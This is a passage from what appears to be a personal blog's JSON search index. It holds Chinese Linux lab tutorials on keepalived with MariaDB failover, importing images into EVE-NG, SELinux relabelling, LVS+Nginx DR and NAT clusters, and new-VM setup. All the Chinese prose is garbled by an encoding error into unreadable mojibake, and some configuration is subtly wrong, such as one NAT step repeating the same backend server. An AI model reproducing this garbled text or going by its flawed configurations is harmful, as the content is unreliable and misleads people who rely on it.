}\n}\n```\n\n* mariadb-2 çš„`/etc/keepalived/keepalived.conf` çš„å†…å®¹å¦‚ä¸‹ \n\nå…¨å±€é…ç½®æ®µ\n\n```bash\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\nå¯ç”¨ vrrp_script æ¨¡å—ï¼Œ å®šä¹‰å¯¹ mariadb æœåŠ¡çš„ç›‘æµ‹\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD é…ç½®æ®µ\n\n```bash\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. åœ¨ä¸¤ä¸ªä¸»æœºä¸Šç¼–å†™æœåŠ¡æ£€æµ‹è„šæœ¬`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. å¯åŠ¨ä¸¤å°æœåŠ¡å™¨çš„`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived é…ç½®æˆåŠŸ](./keepalived-linux/7.png)\n\nå¯ä»¥çœ‹å‡ºmariadb-1ä¸»æœºå·²ç»å¤šå‡ºæ¥ä¸€ä¸ª172.21.8.50/24çš„ä¸€ä¸ªIPï¼Œè¿™ä¸ªå°±æ˜¯è™šæ‹Ÿå‡ºæ¥çš„VIPï¼Œå½“mariadb-1ä¸»æœºå®•æ‰ï¼Œè¿™ä¸ªIPå°±ä¼šæ¼‚ç§»åˆ°mariadb-2ä¸»æœºä¸Šï¼Œåˆ°è¿™é‡Œå°±å®Œæˆäº†mariadbåŒä¸»å¤åˆ¶å’Œkeepalivedçš„å®ç°ã€‚\n","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"EVEå¯¼å…¥CENTOS8çš„é•œåƒ","url":"/2023/05/31/eve-import-img/","content":"\næœ€è¿‘åšpythonçš„ä¸‰çº§é¡¹ç›®ï¼Œéœ€è¦åœ¨EVEé‡Œé¢ä½¿ç”¨æœåŠ¡å™¨çš„èŠ‚ç‚¹ï¼Œå› ä¸ºEVEæ˜¯ä¸è‡ªå¸¦ç›¸å…³é•œåƒçš„ï¼Œåªèƒ½é€šè¿‡è‡ªå·±å¯¼å…¥çš„æ–¹å¼ï¼Œå…¨ç½‘çš„æ•™ç¨‹å±‚å‡ºä¸ç©·ï¼Œåœ¨å€Ÿé‰´å­¦ä¹ äº†å‡ ç¯‡æ–‡ç« åï¼Œç®€æ˜ç²¾è¦çš„åšå‡ºä¸€ä¸‹æ€»ç»“ã€‚\n\n### å‰æœŸå‡†å¤‡\n\né¦–å…ˆéœ€è¦EVEçš„å¯¼å…¥é•œåƒï¼Œæˆ‘åªç”¨åˆ°äº†CENTOS8çš„ï¼Œ[ç›¸å…³é“¾æ¥](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) æ”¾åœ¨äº†äº‘ç›˜é‡Œï¼Œæå–ç ï¼š0731ï¼Œéœ€è¦è‡ªå–ã€‚è™šæ‹Ÿæœºçš„`user`ç”¨æˆ·å’Œ`root`å¯†ç å‡ä¸º`Test123`ã€‚\n\n<!-- more -->\n\n### æ“ä½œæ­¥éª¤\n\n1. ä½¿ç”¨æ–‡ä»¶ä¼ è¾“å·¥å…·å°†é•œåƒå¯¼å…¥åˆ°eveçš„è™šæ‹Ÿæœºé‡Œé¢ï¼Œä¸Šä¼ è·¯å¾„ä¸º`/opt/unetlab/addons/qemu/`\n\n2. æ¥ç€ä½¿ç”¨å‘½ä»¤è§£å‹è¿™ä¸ªæ–‡ä»¶\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. æ‰§è¡Œå‘½ä»¤ä¿®æ­£æƒé™ã€‚\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>ä¿®æ­£æƒé™æˆ‘ä¹Ÿä¸çŸ¥é“ä¸è¿›è¡Œè¿™æ­¥ä¼šæŠ¥ä»€ä¹ˆé”™ï¼Œæˆ‘æ²¡è¿›è¡Œè¿™æ­¥ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œæ€»ä¹‹ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œè¿™æ­¥ï¼Œç„¶åé‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œä¸å¦¨å›æ¥è¡¥ä¸€ä¸‹è¿™ä¸ªæ“ä½œã€‚\n\n4. æœ€åå¤§åŠŸå‘Šæˆï¼Œåœ¨EVEç½‘é¡µä¸­å¯ä»¥ä½¿ç”¨äº†(é¼ æ ‡å³å‡»-->node-->linux-->image)ã€‚\n\n![å¯¼å…¥æˆåŠŸ](./eve-import-img/1.png)\n\n---\n\n### è¡¥å……\n\nåº”***æ±ªæŸäºº***çš„éœ€æ±‚ï¼ˆä½œä¸ºä¸€åå‡ºè‰²çš„åšä¸»ï¼Œåº”è¯¥åšåˆ°å°½å–„å°½ç¾ï¼‰ï¼Œå†è¡¥å……ä¸€ç‚¹å†…å®¹ã€‚\n\n* é¦–å…ˆæ˜¯EVEè¿æ¥æ—¶æœ‰ä¸€ä¸ªå¾ˆå‘çš„ç‚¹ï¼Œè™šæ‹Ÿæœºæ‰“å¼€æ—¶æç¤ºé»˜è®¤ç”¨æˆ·åæ˜¯`root`ï¼Œå¯†ç æ˜¯`eve`ã€‚ä½†å…¶å®å¯†ç æ˜¯ä¸å¯¹çš„ï¼Œå¯†ç æ˜¯`cisco`ã€‚ä¸æ¸…æ¥šæ˜¯ä¸æ˜¯å› ä¸ºç‰ˆæœ¬çš„é—®é¢˜ã€‚æ€»ä¹‹ï¼Œå¦‚æœ`eve`ä¸å¥½ä½¿ï¼Œå°±æ¢æˆ`cisco`è¯•è¯•ã€‚\n\n* è¿æ¥å·¥å…·å¤§å¤šæ•°äººä½¿ç”¨çš„éƒ½æ˜¯Xshellå’ŒXFTPï¼Œè¿™ä¸¤ä¸ªå·¥å…·ç¡®å®éå¸¸ä¸é”™ï¼Œä½†æ˜¯åæ¥æœ¬äººåœ¨é€›githubæ—¶ï¼Œå‘ç°ä¸€ä¸ªéå¸¸å¥½ç”¨çš„å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯å…è´¹å¼€æºçš„ï¼Œå¹¶ä¸”é›†åˆäº†Xshellè¿œç¨‹å‘½ä»¤çš„åŠŸèƒ½å’ŒXFTPçš„æ–‡ä»¶ä¼ è¾“åŠŸèƒ½ï¼Œè¿˜æœ‰é¢å¤–çš„CMDçª—å£ã€‚æ”¯æŒwindowsè§†çª—åŒ–æŸ¥çœ‹è™šæ‹Ÿæœºçš„æ–‡ä»¶ã€‚æˆªå›¾å¦‚ä¸‹ï¼Œ[é“¾æ¥åœ¨è¿™](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) ã€‚\n\n![windterm](./eve-import-img/2.png)\n\n","tags":["EVE"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"å…³äºseliunxçš„å­¦ä¹ è¿‡ç¨‹","url":"/2023/05/24/seliunx/","content":"\n### ä¿®æ”¹æ–‡ä»¶SELinuxçš„ä¸Šä¸‹æ–‡\n\n#### å®éªŒç›®çš„ï¼šä¿®æ”¹æ–‡ä»¶çš„selinuxä¸Šä¸‹æ–‡æ ‡ç­¾ï¼ŒæŠŠ`/home/student`ç›®å½•çš„selinuxä¸Šä¸‹æ–‡æ ‡ç­¾æ›¿æ¢ä¸º`/root`ç›®å½•çš„selinuxä¸Šä¸‹æ–‡æ ‡ç­¾ã€‚\n\n * æŸ¥çœ‹studentç›®å½•çš„selinux\n\n```bash\n[root@servera home]# ls -dZ student/\nunconfined_u:object_r:user_home_dir_t:s0 student/\n```\n\n<!-- more -->\n\n**user_home_dir_t**çš„éƒ¨åˆ†å°±æ˜¯`/home/student`çš„selinuxçš„ä¸Šä¸‹æ–‡ã€‚\n\n * æŸ¥çœ‹rootç›®å½•çš„selinux\n\n```bash\n[root@servera /]# ls -Zd /root/\nsystem_u:object_r:admin_home_t:s0 /root/\n```\n\n**admin_home_t**çš„éƒ¨åˆ†å°±æ˜¯`/root`çš„selinuxçš„ä¸Šä¸‹æ–‡ã€‚\n\n* ä¿®æ”¹å‘½ä»¤\n\n```bash\n[root@servera /]# semanage fcontext -a -t admin_home_t '/home/student(/.*)?'\n```\n\n`'/home/student(/.*)?'`éƒ¨åˆ†åé¢çš„`(/.*)?`æ˜¯å›ºå®šçš„ã€‚\n\n* ä½¿é…ç½®ç”Ÿæ•ˆ\n\n```bash\n[root@servera /]# restorecon -RFvv /home/student/\nRelabeled /home/student from unconfined_u:object_r:user_home_dir_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_logout from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_profile from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bashrc from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/known_hosts from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.ssh/authorized_keys from unconfined_u:object_r:ssh_home_t:s0 to system_u:object_r:admin_home_t:s0\nRelabeled /home/student/.bash_history from unconfined_u:object_r:user_home_t:s0 to system_u:object_r:admin_home_t:s0\n\n```\n\n* å†æ¬¡æŸ¥çœ‹studentç›®å½•çš„selinux\n\n```bash\n[root@servera /]# ls -dZ /home/student/\nsystem_u:object_r:admin_home_t:s0 /home/student/\n```\n\nå‘ç°studentç›®å½•çš„selinuxå€¼å˜æˆäº†**admin_home_t**ã€‚\n\n---","tags":["Linux"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"ä½¿ç”¨LVS+Nginxé…ç½®DRæ¨¡å¼çš„Webé›†ç¾¤","url":"/2023/05/18/LVS-Nginx-DR/","content":"\n### å‡†å¤‡å·¥ä½œ\n\néœ€è¦æœ€å°‘å‡†å¤‡ä¸‰å°è™šæ‹Ÿæœºï¼Œå…³é—­selinxå’Œé˜²ç«å¢™ã€‚\n\n||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|ä¸»æœºå|èº«ä»½|ç½‘ç»œæ¥å£|è¿æ¥æ¨¡å¼|IPåœ°å€|è½¯ä»¶|\n|DS|è°ƒåº¦æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.80/24|ipvsadm|\n|web1|çœŸå®æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.20/24|nginx|\n|web1|çœŸå®æœåŠ¡å™¨|lo(VIP)|-|172.21.8.80/32|nginx|\n|web2|çœŸå®æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.30/24|nginx|\n|web2|çœŸå®æœåŠ¡å™¨|lo(VIP)|-|172.21.8.80/32|nginx|\n\nPS:\n\n1. å»ºè®®DSï¼ˆè°ƒåº¦æœºï¼‰çš„ç½‘å¡ä½¿ç”¨ä»…ä¸»æœºæ¨¡å¼çš„ã€‚\n2. web1å’Œweb2çš„loopbackç½‘å¡éƒ½è¦è®¾ç½®ä¸ºDSä¸»æœºçš„metricå€¼å¤§çš„é‚£ä¸€å¼ ç½‘å¡ã€‚\n<!-- more -->\n3. å¯ä»¥ä½¿ç”¨```route -n```æŸ¥çœ‹**metric**å€¼ã€‚\n4. **metric**å€¼å¯ä»¥åœ¨ç½‘å¡é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œä¿®æ”¹åè®°å¾—é‡å¯ç½‘ç»œæœåŠ¡ç”Ÿæ•ˆã€‚\n\n### DSä¸»æœºé…ç½®\n\n```bash\nipvsadm -A -t 172.21.8.80:80 -s wrr\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.20:80 -g -w 1\nipvsadm -a -t 172.21.8.80:80 -r 172.21.8.30:80 -g -w 2\nipvsadm --set 1 1 1\n```\n\nè°ƒåº¦ç­–ç•¥ä¸­ï¼Œå‰é¢çš„è¿™ä¸ªIPæ˜¯è°ƒåº¦æœºè™šæ‹Ÿå‡ºæ¥çš„VIPï¼Œåé¢çš„è¿™ä¸ªIPæ˜¯çœŸå®WebæœåŠ¡å™¨çš„IPåœ°å€ã€‚\n\nä¹Ÿå¯ä»¥ç›´æ¥ç¼–è¾‘æˆä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œæ–¹ä¾¿åé¢è¿›è¡Œç­–ç•¥çš„è°ƒæ•´\n\n```bash\n#!/bin/bash\nipvsadm -C\nipvsadm -A -t 10.8.7.10:80 -s wrr\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.80:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.81:80 -g -w 2\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.82:80 -g -w 1\nipvsadm -a -t 10.8.7.10:80 -r 10.8.7.83:80 -g -w 2\nipvsadm --set 1 1 1\necho \"è½®å·¡ç­–ç•¥å·²æˆåŠŸæ·»åŠ ï¼ï¼ï¼\"\n```\n\n### Web1ä¸»æœºå’ŒWeb2ä¸»æœºé…ç½®\n\n* é…ç½®å›ç¯æ¥å£ï¼ˆVIPï¼‰\n\n```bash\nip addr add 172.21.8.80/32 dev lo\n```\n\nå› ä¸ºç¯å›å£é…ç½®çš„IPåœ¨æ¯æ¬¡é‡å¯ä¹‹åéƒ½ä¼šä¸¢å¤±IPï¼Œæ¯æ¬¡é…ç½®èµ·æ¥ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼ŒåŒæ ·çš„æŠŠä»–å†™æˆä¸€ä¸ªè„šæœ¬\n\n```bash\n#!/bin/bash\nip addr add 10.8.7.10/32 dev lo:1\necho \"VIP å·²ç»æˆåŠŸæ·»åŠ åˆ°loopbackå£ã€‚\"\n```\n\n* ä¿®æ”¹Web1å†…æ ¸æ§åˆ¶ç³»ç»Ÿarpå“åº”\n\n  å› ä¸ºè¦ä¿®æ”¹4ä¸ªæ–‡ä»¶ï¼Œè®¾ç½®çš„å€¼ä¹Ÿæ¯”è¾ƒç®€å•ã€‚åªæœ‰åœ¨ä½¿ç”¨LVS+Nginxé…ç½®DRæ¨¡å¼çš„æ—¶å€™æ‰ä¼šå°†è¿™4ä¸ªæ–‡ä»¶è®¾ç½®ä¸ºè¯¥å€¼ï¼Œå¹³å¸¸ä½¿ç”¨è¦ä½¿ç”¨é»˜è®¤å€¼ã€‚ä¸ºäº†åˆ‡æ¢æ–¹ä¾¿ä¸€ç‚¹ï¼Œå»ºè®®ä½¿ç”¨è„šæœ¬çš„æ–¹å¼ã€‚\n\n```bash\n#!/bin/bash\nif [ $# -ne 1 ]\nthen\n    echo 'error!'\"usage:$0 on|off\"\n    exit 1\nfi\ncase $1 in\n    on)\n        echo \"1\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"1\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"2\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR æ¨¡å¼å·²å¼€å¯ï¼\"\n        ;;\n    off)\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/lo/arp_announce\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_ignore\n        echo \"0\" > /proc/sys/net/ipv4/conf/all/arp_announce\n        echo \"LVS DR æ¨¡å¼å·²å…³é—­ï¼\"\n        ;;\n    *)\n        echo 'error!'\"usage:$0 on|off\"\n        exit 1\nesac\n```\n\n* æ‰§è¡Œè„šæœ¬\n\n```bash\nchmod +x lvs_dr.sh\n./lvs_dr.sh on\n```\n\n### æµ‹è¯•\n\n1. åœ¨Web1ã€Web2å¯åŠ¨Nginxã€‚\n2. åˆ†åˆ«æ‰§è¡Œ```curl 172.21.8.20```ï¼Œ```curl 172.21.8.30```ã€‚éªŒè¯æ— è¯¯åï¼Œåœ¨å®¢æˆ·ç«¯ï¼ˆç¬¬4å°æœºå™¨ï¼‰ä¸Šæµ‹è¯•```curl 172.21.8.80```ï¼Œä½¿ç”¨**DR**æœºå™¨æ˜¯ä¸å¥½ä½¿çš„ã€‚\n\n>ç‰ˆæƒå£°æ˜ï¼šä»¥ä¸Šçš„shellè„šæœ¬çŸ¥è¯†äº§æƒç”±ç§äººæ‰€æœ‰ï¼Œç¦æ­¢å•†ç”¨ã€‚","tags":["Linux"],"categories":["æŠ€æœ¯"]},{"title":"Linuxä½¿ç”¨å°tips","url":"/2023/05/18/linux-tips/","content":"\n### å¸¸ç”¨çš„ä¸€äº›æ“ä½œ\n\n1. æ°¸ä¹…ä¿®æ”¹SELINUXå€¼ã€‚\n\nä½¿ç”¨è™šæ‹Ÿæœºè¿›è¡Œä¸€äº›æœåŠ¡çš„é…ç½®çš„æ—¶å€™ï¼Œå¦‚æœSELINXçš„å€¼ä¸è°ƒæ•´ä¸ºpermissiveï¼Œç»å¸¸ä¼šå‡ºç°ä¸€äº›ç¨€å¥‡å¤æ€ªçš„é”™è¯¯ï¼Œå¦‚æœæ¯æ¬¡éƒ½å¼€æœºè®¾ç½®```setenforce 0```å°±å¤ªéº»çƒ¦äº†ã€‚æ‰€ä»¥ç›´æ¥ç¼–è¾‘```/etc/selinux/config```æ–‡ä»¶ï¼Œè®¾ç½®```SELINUX=permissive```ï¼Œæœ€åä¿å­˜é€€å‡ºã€‚\n\n2. æ°¸ä¹…ä¿®æ”¹ç½‘å¡çš„IPåœ°å€ã€‚\n\nåœ¨å¹³å¸¸çš„æœåŠ¡å™¨çš„é…ç½®æ—¶ï¼Œæ€»æ˜¯ä¼šæ¶‰åŠåˆ°IPçš„å˜åŠ¨ï¼Œæˆ‘ä¸ªäººä½¿ç”¨æœ€å¤šçš„æ–¹æ³•æ˜¯ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚\n\n<!-- more -->\n\nç½‘å¡é…ç½®æ–‡ä»¶```/etc/sysconfig/network-scripts/ifcfg-ens160```ã€‚åˆ†æˆå‡ ç‚¹æ¥è¯´ã€‚\n\n* BOOTPROTO=noneï¼Œå¯é€‰å€¼è¿˜æœ‰staticã€dhcpã€autoã€‚noneå’ŒstaticåŠŸèƒ½ä¸€æ ·ï¼Œdhcpå’ŒautoåŠŸèƒ½ä¸€æ ·ã€‚\n\n* ONBOOT=yesï¼Œè®¾ç½®å¼€æœºç½‘å¡è‡ªå¯çš„ï¼Œå»ºè®®è®¾ç½®ä¸º*yes*ï¼Œå¯é€‰å€¼è¿˜æœ‰*no*\n\n* å¦‚æœç½‘å¡ä¸€å¼€å§‹æ˜¯ä½¿ç”¨åŠ¨æ€è·å–çš„ï¼Œæ”¹æˆæ‰‹åŠ¨åï¼Œå°±è¦é€šè¿‡ç¼–è¾‘é…ç½®æ–‡ä»¶æ¥è¿›è¡ŒIPçš„è®¾ç½®ã€‚åªéœ€è¦åœ¨æ–‡ä»¶çš„æœ«å°¾åŠ ä¸Š\n\n```bash\nIPADDR=192.168.20.10    # *è®¾ç½®IP*\nGATEWAY=192.168.20.254    # *è®¾ç½®ç½‘å…³*\nPREFIX=24    # *è®¾ç½®å­ç½‘æ©ç *\n```\n\næœ‰çš„é…ç½®æ–‡ä»¶è¿˜å¯ä»¥çœ‹åˆ°\n\n```bash\nDNS1=8.8.8.8\nDNS2=114.144.144.114\n```\n\nä½†æ˜¯æˆ‘å¹¶ä¸å»ºè®®å¤§å®¶åœ¨è¿™é‡Œè®¾ç½®DNSï¼Œä¸€æ˜¯æ ¹æœ¬ä¸ä¼šèµ·ä»€ä¹ˆä½œç”¨ï¼Œå› ä¸ºä½¿ç”¨DNSçš„è¿˜æœ‰å¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ˆ```/etc/resolv.conf```ï¼‰ï¼ŒäºŒå°±æ˜¯å®ƒä¼šå’Œ```/etc/resolv.conf```æ–‡ä»¶æŒ‡å®šçš„DNSç›¸äº’å†²çªã€‚\n\n* æ›´æ”¹å®Œé…ç½®æ–‡ä»¶åï¼ŒIPå¹¶ä¸ä¼šé©¬ä¸Šæ”¹å˜ã€‚éœ€è¦æ‰‹åŠ¨è¿›è¡Œä¸€ä¸‹é‡å¯ã€‚ä¸ªäººæ€»ç»“å‡ºæ¥çš„ä¸€äº›ç»éªŒï¼Œå‘½ä»¤æ‰§è¡Œçš„é¡ºåºå»ºè®®éƒ½ä¸è¦æ”¹å˜ã€‚\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\nè¿™æ ·**3**æ¡å‘½ä»¤ä¸‹æ¥ï¼Œæ—§IPå†é¡½å›ºï¼Œä¹Ÿä¼šæ— å¥ˆå˜æˆé…ç½®æ–‡ä»¶ä¸­çš„IPã€‚","tags":["Linux"],"categories":["å°ç©æ„å„¿"]},{"title":"æ–°çš„Linuxè™šæ‹Ÿæœºå¿«é€ŸåŸºæœ¬é…ç½®","url":"/2023/05/18/linux-init/","content":"\n### é…ç½®é˜¿é‡Œyumæº\n\n1. é¦–å…ˆä¿è¯è™šæ‹Ÿæœºå¯ä»¥æ­£å¸¸è®¿é—®ç½‘ç»œã€‚\n2. æ‰§è¡Œå‘½ä»¤ï¼Œä¸‹è½½yumæºã€‚(CENTOS-7)\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n\nCENTOS-8 yumæº\n\n```bash\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo\n```\n\n<!-- more -->\n\n3. æ¸…é™¤yumç¼“å­˜ï¼Œé‡æ–°ç”Ÿæˆã€‚\n\n```bash\nyum clean all && yum makecache\n```\n\nPS:\n\n**CENTOS-7å’ŒCENTOS-8çš„yumæºæœ€å¥½ä¸è¦æ··ç€ä½¿ç”¨ï¼Œæ˜¯ä»€ä¹ˆç‰ˆæœ¬å°±ç”¨ä»€ä¹ˆç‰ˆæœ¬ã€‚**\n\n### å¿…å¤‡çš„è½¯ä»¶\n\n1. **vimå·¥å…·**ï¼Œæœ€å°åŒ–ç¯å¢ƒæ˜¯æ²¡æœ‰vimçš„ï¼Œvimå’Œviçš„åŒºåˆ«åœ¨æœ€å°åŒ–ç¯å¢ƒé‡Œè¡¨ç°çš„å°±æ˜¯é…ç½®æ–‡æ¡£çš„é«˜äº®æ˜¾ç¤ºäº†ï¼Œå¼ºçƒˆå»ºè®®å®‰è£…vimã€‚\n\n```bash\nyum install -y vim\n```\n\n2. **wget**å·¥å…·ï¼Œç”¨æ¥ä¸‹è½½ä¸€äº›ç½‘ç»œèµ„æºï¼ŒåŒæ ·æœ€å°åŒ–æ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥è¦ä¸‹è½½ä¸€ä¸ªã€‚\n\n```bash\nyum install -y wget\n```\n\n3. **bash-completion**åŒ…ï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ç”¨æ¥å‘½ä»¤è¡¥å…¨çš„ï¼Œç®€ç›´ä¸è¦å¤ªå¥½ç”¨ï¼Œ<kbd>Tab</kbd>é”®çˆ±å¥½è€…ç‹‚å–œã€‚\n\n```bash\nyum install -y bash-completion\n``` \n\n4. **treeå·¥å…·**ï¼Œä½¿ç”¨å›¾å½¢çš„æ–¹å¼å±•ç¤ºç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„ï¼Œä¸ç”¨çš„æ—¶å€™åƒç°ä¹Ÿä¸ä¼šå°‘ï¼Œç”¨çš„æ—¶å€™å°±çŸ¥é“è¿™ä¸ªçš„å¥½å¤„äº†ã€‚\n\n```bash\nyum install -y tree\n```\n\n6. **net-tools**ï¼Œè¿™ä¸ªå·¥å…·æä¾›äº†æ¯”å¦‚`ifconfig`ï¼Œ`netstat`ï¼Œ`arp`ï¼Œ`route`å‘½ä»¤ï¼Œæœ‰æ—¶å€™ç”¨èµ·æ¥å‘ç°æ²¡æœ‰è¿™ä¸ªå‘½ä»¤çš„è¯ï¼Œè®°å¾—å®‰è£…è¿™ä¸ªåŒ…ã€‚\n\n```bash\nyum install -y net-tools\n```\n\n5. **lsofå·¥å…·**ï¼ŒæŸ¥çœ‹ç«¯å£ç›‘å¬çš„å¸¸ç”¨å·¥å…·ï¼Œä¸ªäººæ¥è®²ä½¿ç”¨é¢‘ç‡é«˜äº`netstat`ï¼Œä½¿ç”¨ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯ä»¥å®‰è£…ä¸€ä¸ªã€‚\n\n```bash\nyum install -y lsof\n```\n\né…ç½®å®Œè¿™äº›ï¼ŒåŸºç¡€çš„ä¸œè¥¿å°±å¯ä»¥å‘Šä¸€æ®µè½äº†ã€‚","tags":["Linux"],"categories":["å°ç©æ„å„¿"]},{"title":"ä½¿ç”¨LVS+Nginxé…ç½®NATæ¨¡å¼çš„Webé›†ç¾¤","url":"/2023/05/17/LVS-Nginx-NAT/","content":"\n### å‡†å¤‡æ¡ä»¶\n\néœ€è¦æœ€å°‘å‡†å¤‡ä¸‰å°è™šæ‹Ÿæœºï¼Œå…³é—­selinxå’Œé˜²ç«å¢™ã€‚\n\n|||||||||\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n|ä¸»æœºå|èº«ä»½|ç½‘ç»œæ¥å£|è¿æ¥æ¨¡å¼|IPåœ°å€|ç½‘å…³|è½¯ä»¶|\n|DS|è°ƒåº¦æœåŠ¡å™¨|ens160|nat|192.168.20.40/24|192.168.20.254|ipvsadm|\n|DS|è°ƒåº¦æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.10/24|-|ipvsadm|\n|web1|çœŸå®æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.20/24|172.21.8.10/24|nginx|\n|web2|çœŸå®æœåŠ¡å™¨|ens224|ä»…ä¸»æœº|172.21.8.30/24|172.21.8.10/24|nginx|\n\nPS:\n\n1. DSä¸€å®šæ˜¯ä¸¤å—ç½‘å¡ï¼Œå¹¶ä¸”ç”¨ä¸€å¼ ç½‘å¡å»ä½œä¸ºçœŸå®æœåŠ¡å™¨çš„ç½‘å…³ã€‚\n2. DSçš„ä¸¤å—ç½‘å¡æœ€å¥½æ¨¡å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚\n\n<!-- more -->\n\n### DSçš„é…ç½®\n\nä¸‹è½½ipvsadm\n\n```bash\nyum install -y ipvsadm\n```\n\næ·»åŠ ä¸€ä¸ªè™šæ‹ŸæœåŠ¡æŒ‡å®šè¿è¾“å±‚åè®®ä¸ºTCPã€VIPä¸º192.168.20.40ã€ç«¯å£ä¸º80ã€è°ƒåº¦ç®—æ³•ä¸ºåŠ æƒè½®è®­ã€‚\n\n```bash\nipvsadm -A -t 192.168.20.40:80 -s rr\n```\n\nä¸ºè™šæ‹ŸæœåŠ¡å™¨æ·»åŠ åç«¯çœŸå®æœåŠ¡å™¨\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\n```bash\nipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m\n```\n\nä½¿ç”¨å‘½ä»¤æŸ¥çœ‹ç”Ÿæˆçš„ç­–ç•¥\n\n```bash\nipvsadm -Ln\n```\n\nå¼€å¯è·¯ç”±è½¬å‘åŠŸèƒ½\n\n```bash\necho \"1\" > /proc/sys/net/ipv4/ip_forward\n```\n\nä½¿ç”¨å‘½ä»¤ä¿®æ”¹è½®è®­çš„æ—¶é—´\n\n```bash\nipvsadm --set 1 1 1\n```\n\nä½¿ç”¨å‘½ä»¤æŸ¥çœ‹è¶…æ—¶æ—¶é—´è®¾ç½®\n\n```bash\nipvsadm -L --timeout\n```\n\n### WEB1é…ç½®\n\nä¸‹è½½Nginx\n\n```bash\nyum install -y nginx\n```\n\nnginxçš„é…ç½®æ–‡ä»¶ä¿å­˜åœ¨```/etc/nginx/nginx.conf```\n\nä½¿ç”¨å‘½ä»¤å»æ‰Nginxé…ç½®æ–‡ä»¶çš„ç©ºè¡Œå’Œæ³¨é‡Šè¡Œ\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n\nä¿®æ”¹é…ç½®æ–‡ä»¶\n\n```bash\nworker_processes  1;\nevents {\n    worker_connections  1024;\n}\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n    sendfile        on;\n    keepalive_timeout  65;\n    server {\n        listen       80;\n        server_name  172.21.8.20;    # æœ¬æœºIP\n        location / {\n            root   /web;    # æ ¹ç›®å½•åœ°å€\n            index  index.html index.htm;    # è¦å»å¯»æ‰¾çš„æ–‡ä»¶\n        }\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    